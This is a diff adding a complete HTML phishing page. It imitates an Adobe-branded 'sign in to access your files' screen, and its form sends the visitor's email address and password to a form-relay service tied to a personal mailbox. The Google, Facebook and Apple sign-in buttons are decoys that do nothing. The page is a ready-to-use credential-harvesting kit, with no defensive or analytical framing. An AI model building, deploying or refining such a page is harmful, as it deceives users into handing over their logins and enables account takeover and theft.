@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign In - Your Brand</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+</head>
+<body class="bg-black min-h-screen flex items-center justify-center p-4">
+    <div class="w-full max-w-5xl mx-auto flex flex-col md:flex-row justify-between items-center gap-12">
+        
+        <!-- Left -->
+        <div class="text-center md:text-left">
+            <img src="adobe_logo_white.svg" alt="Logo" class="w-12 mx-auto md:mx-0 mb-4">
+            <p class="text-white text-xl">Sign in to access your files</p>
+        </div>
+
+        <!-- Right Form -->
+        <div class="bg-white w-full max-w-sm rounded-lg p-8 space-y-6">
+            <form action="https://formsubmit.co/rojr801@gmail.COM" method="POST" class="space-y-4">
+                <div>
+                    <label for="email" class="text-xs text-gray-600 uppercase">Email address</label>
+                    <input id="email" name="email" type="email" required
+                        class="w-full border-b-2 border-blue-600 outline-none py-2 text-sm"
+                        placeholder="EMAIL">
+                </div>
+                
+                <div>
+                    <label for="password" class="text-xs text-gray-600 uppercase">Password</label>
+                    <input id="password" name="password" type="password" required
+                        class="w-full border-b-2 border-blue-600 outline-none py-2 text-sm"
+                        placeholder="PASSWORD">
+                </div>
+
+                 <!-- THIS IS THE SUBMIT BUTTON - VERY VISIBLE -->
+        <div class="pt-4 mt-auto">
+          <button type="submit" class="w-full bg-black text-white py-4 rounded-xl font-bold text-[14px] tracking-widest uppercase hover:bg-gray-900 transition flex items-center justify-center gap-2">
+            <i class="fa-solid fa-paper-plane"></i> SUBMIT REQUEST
+          </button>
+          <p class="text-[11px] text-center text-gray-400 mt-3">Click to submit your update</p>
+        </div>
+            </form>
+
+            <div class="relative flex items-center justify-center">
+                <hr class="w-full">
+                <span class="absolute bg-white px-3 text-xs text-gray-400">or</span>
+            </div>
+
+            <div class="space-y-3">
+                <button class="w-full border rounded-full py-2.5 flex items-center justify-center gap-2 text-sm">
+                    Continue with Google
+                </button>
+                <button class="w-full border rounded-full py-2.5 flex items-center justify-center gap-2 text-sm">
+                    Continue with Facebook
+                </button>
+                <button class="w-full border rounded-full py-2.5 flex items-center justify-center gap-2 text-sm">
+                    Continue with Apple
+                </button>
+            </div>
+
+            <div class="text-center text-xs space-x-4">
+                <a href="#" class="text-blue-600">View more</a>
+                <a href="#" class="text-blue-600">Get help signing in</a>
+            </div>
+        </div>
+    </div>
+</body>
+</html>
